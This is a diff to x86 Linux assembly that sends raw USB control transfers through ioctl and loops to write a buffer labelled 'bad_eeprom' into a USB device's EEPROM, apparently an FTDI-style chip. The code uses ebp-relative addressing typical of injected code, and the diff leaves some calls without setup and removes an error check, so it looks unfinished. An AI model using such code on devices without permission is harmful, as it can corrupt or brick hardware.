@@ -125,10 +125,11 @@ main:
 
     allocstackz 0x20
 
-    mov BYTE [esp+0x9], 0x40
+    mov BYTE [esp], 0x40
+    mov BYTE [esp+0x4], 0x01
 
     mov ebx, esi 
-    mov ecx, 0xC0105500
+    mov ecx, 0xC0105500 ; CONTROL_TRANSFER
     mov edx, esp 
     mov eax, 0x36
     int 80h
@@ -138,32 +139,28 @@ main:
 
     ; Poll Modem
 
+    ; COMPROBAR ESTO, PORQUE DEVUELVE < 0?
 
-    mov [esp], esp
-    add DWORD [esp], 0x18
-    mov BYTE [esp+0x9], 0xC0
-    mov BYTE [esp+0xA], 0x05
-    mov BYTE [esp+0xF], 0x02
+   ; mov [esp], esp
+   ; add BYTE [esp], 0xB
+    mov BYTE [esp], 0xC0
+    mov BYTE [esp+0x1], 0x05
+    mov BYTE [esp+0x4], 0x01
+    mov BYTE [esp+0x6], 0x02
 
-    mov edx, esp ; arg
-    mov ecx,0xC014556F ; cmd 
-    mov ebx, esi ; FD
     mov eax, 0x36
     int 80h
 
-    cmp eax, 0x0
-    jl end
+
 
     ; Latency
 
 
-    mov BYTE [esp+0x9], 0x40
-    mov BYTE [esp+0xA], 0x09
-    mov BYTE [esp+0xB], 0x77
-    mov BYTE [esp+0xF], 0x00
+    mov BYTE [esp], 0x40
+    mov BYTE [esp+0x1], 0x09
+    mov BYTE [esp+0x2], 0x77
+    mov BYTE [esp+0x6], 0x00
 
-    mov edx, esp
-    mov ecx, 0xC014556F
     mov eax, 0x36
     int 80h
 
@@ -175,26 +172,26 @@ main:
 
     lea edi, [ebp+bad_eeprom]
     mov esi, 0x0
-
+    xor ecx, ecx 
     write_cell_loop:
 
     mov cx, [edi]
 
-    mov BYTE [esp+0x9], 0x40
-    mov BYTE [esp+0xA], 0x91
-    mov BYTE [esp+0xB], cl
-    mov BYTE [esp+0xC], ch
-    mov DWORD [esp+0xD], esi
+    mov BYTE [esp], 0x40
+    mov BYTE [esp+0x01], 0x91
+    mov BYTE [esp+0x02], cl
+    mov BYTE [esp+0x03], ch
+    mov DWORD [esp+0x04], esi
 
     mov edx, esp
-    mov ecx, 0xC014556F
+    mov ecx, 0xC0105500 ; 0xC014556F
     mov eax, 0x36
     int 80h
 
     inc esi
     add edi, 0x2
 
-
+    xor ecx, ecx 
     cmp esi, 0x40
     jne write_cell_loop
     add esp, 0x20
@@ -226,15 +223,13 @@ incdesc:
     jmp end
 
 msg:
-    push 0x8
-    lea eax, [ebp+uid_msg]
-    push eax
-    push 0x1
-    mov eax, 0x4
-    push 0xBEBECAFE
-    int 80h
 
-    add esp, 4*4
+    mov ebx, 0x1
+    lea ecx, [ebp+uid_msg]
+    mov edx, 0x8
+    
+    mov eax, 0x4
+    int 80h
 
 end:
 
